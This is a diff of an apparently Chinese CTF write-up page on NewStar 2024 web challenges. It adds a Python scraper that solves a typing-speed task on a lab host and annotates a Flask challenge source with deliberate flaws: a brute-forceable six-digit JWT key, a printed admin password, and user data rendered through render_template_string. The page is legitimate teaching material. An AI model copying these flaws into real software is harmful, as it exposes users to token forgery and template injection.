@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://luo-kaihong.github.io/p/2024newstar-web/'>
 
-<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="2024newstar-web">
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2024newstar-web">
 <meta property='og:description' content=" week1 PangBai 过家家（1） 考点：通过token跳转页面，PATCH传参（需要注意传参方法,Content-Type） 第一关，说头部有东西\n抓包发现请求头没东西，发包看看响应头，有一个路由\n访问进入第二关，这个提示应该是要我们get传个参\n刚刚get传了，这里显然就是post传参\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2024newstar-web/'>
 <meta property='og:site_name' content='罗铠鸿'>
@@ -318,6 +318,19 @@
     </li>
     <li><a href="#这照片是你吗"><strong>这「照片」是你吗</strong></a></li>
   </ol>
+
+  <ol>
+    <li><a href="#pangbai-过家家4"><strong>PangBai 过家家（4）</strong></a></li>
+    <li><a href="#blindsql2"><strong>blindsql2</strong></a>
+      <ol>
+        <li><a href="#时间盲注-过滤空格等号substrascii">时间盲注-过滤空格，/，等号，substr,ascii</a></li>
+      </ol>
+    </li>
+  </ol>
+
+  <ol>
+    <li><a href="#sqlshell"><strong>sqlshell</strong></a></li>
+  </ol>
 </nav>
         </div>
     </section>
@@ -385,7 +398,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 12 分钟
+                    阅读时长: 16 分钟
                 </time>
             </div>
         
@@ -922,7 +935,146 @@
 </div><p>查看源码得</p>
 <img src="image-20250518165421956.png" alt="image-20250518165421956" style="zoom:50%;" />
 <h2 id="你能在一秒内打出八句英文吗"><strong>你能在一秒内打出八句英文吗</strong>
-</h2><h2 id="复读机"><strong>复读机</strong>
+</h2><p>经典爬虫问题，调试一下ai，提取/start英文文本内容，然后再/submit的post参数提交</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve_challenge</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 设置基础URL和headers</span>
+</span></span><span class="line"><span class="cl">    <span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.7.115:60109&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">base_url</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/start&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 创建session以保持cookie</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 访问start页面获取文本</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/start&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># 提取英文文本</span>
+</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># 使用正则表达式提取p标签中的文本（抓包后看源码（或者禁用js也可）精准锁定要提取的内容正则提取）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&lt;p id=&#34;text&#34;&gt;(.*?)&lt;/p&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">user_input</span> <span class="o">=</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;提取到的文本:&#34;</span><span class="p">,</span> <span class="n">user_input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1"># 提交到/submit</span>
+</span></span><span class="line"><span class="cl">            <span class="n">submit_data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;user_input&#34;</span><span class="p">:</span> <span class="n">user_input</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="n">submit_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/submit&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">data</span><span class="o">=</span><span class="n">submit_data</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1"># 返回提交结果</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;extracted_text&#34;</span><span class="p">:</span> <span class="n">user_input</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;submit_response&#34;</span><span class="p">:</span> <span class="n">submit_response</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;error&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;No text found in p tag&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;error&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Request failed: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">solve_challenge</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">最终结果:&#34;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="复读机"><strong>复读机</strong>
 </h2><p>一看flask框架，立马想到ssti，一测果然是，直接打，没过滤</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1568,6 +1720,61 @@
 </span><span class="lnt">176
 </span><span class="lnt">177
 </span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">send_file</span>
@@ -1580,71 +1787,104 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">get_random_number_string</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 生成基础密钥</span>
 </span></span><span class="line"><span class="cl"><span class="n">base_key</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 生成随机数字字符串作为密钥</span>
 </span></span><span class="line"><span class="cl"><span class="n">secret_key</span> <span class="o">=</span> <span class="n">get_random_number_string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 生成管理员密码</span>
 </span></span><span class="line"><span class="cl"><span class="n">admin_pass</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span> <span class="n">_</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">base_key</span><span class="p">])</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 打印管理员密码（实际部署中应避免打印敏感信息）</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">admin_pass</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 创建 Flask 应用实例</span>
 </span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 初始化失败尝试计数</span>
 </span></span><span class="line"><span class="cl"><span class="n">failure_count</span> <span class="o">=</span> <span class="mi">0</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义用户字典，存储用户名和密码</span>
 </span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;admin&#39;</span><span class="p">:</span> <span class="n">admin_pass</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="s1">&#39;amiya&#39;</span><span class="p">:</span> <span class="s2">&#34;114514&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义验证令牌的函数</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="n">failure_count</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 检查失败尝试次数</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">failure_count</span> <span class="o">&gt;=</span> <span class="mi">100</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;You have tried too many times! Please restart the service!&#34;</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 解码 JWT 令牌</span>
 </span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;HS256&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 检查用户是否为管理员</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">            <span class="n">failure_count</span> <span class="o">+=</span> <span class="mi">1</span>
 </span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;You are not admin!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 捕获解码异常</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 验证通过返回 True</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义根路由，重定向到首页</span>
 </span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/home&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义登录路由，处理 POST 请求</span>
 </span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 获取用户名和密码</span>
 </span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">failure_count</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 检查失败尝试次数</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">failure_count</span> <span class="o">&gt;=</span> <span class="mi">100</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">&#34;You have tried too many times! Please restart the service!&#34;</span><span class="p">,</span> <span class="mi">403</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">users</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="o">==</span><span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 验证用户名和密码</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">users</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 生成 JWT 令牌</span>
 </span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;exp&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="mi">600</span><span class="p">},</span> <span class="n">secret_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 创建响应对象</span>
 </span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;Login success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 设置 Cookie</span>
 </span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span>
 </span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 增加失败计数</span>
 </span></span><span class="line"><span class="cl">        <span class="n">failure_count</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 返回认证失败响应</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;Could not verify!&lt;br&gt;&lt;img src=&#34;/3.png&#34;&gt;&#39;</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义登出路由</span>
 </span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 创建响应对象</span>
 </span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="s1">&#39;Logout success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 清除 Cookie</span>
 </span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">expires</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义首页路由</span>
 </span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/home&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
 </span></span><span class="line"><span class="cl">    <span class="n">logged_in</span> <span class="o">=</span> <span class="kc">False</span>
 </span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 获取 Cookie 中的令牌</span>
 </span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 解码 JWT 令牌</span>
 </span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;HS256&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 设置欢迎消息</span>
 </span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;Hello, </span><span class="si">%s</span><span class="s2">!&#34;</span> <span class="o">%</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 标记为已登录</span>
 </span></span><span class="line"><span class="cl">        <span class="n">logged_in</span> <span class="o">=</span> <span class="kc">True</span>
 </span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 捕获解码异常，标记为未登录</span>
 </span></span><span class="line"><span class="cl">        <span class="n">logged_in</span> <span class="o">=</span> <span class="kc">False</span>
 </span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;You have not logged in!&#34;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 渲染模板并返回响应</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
 </span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;!DOCTYPE html&gt;
 </span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;html&gt;
@@ -1678,12 +1918,16 @@
 </span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/html&gt;
 </span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="n">text</span><span class="p">,</span> <span class="n">logged_in</span><span class="o">=</span><span class="n">logged_in</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义管理员面板路由</span>
 </span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
 </span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 获取 Cookie 中的令牌</span>
 </span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 验证令牌</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">True</span><span class="p">:</span>
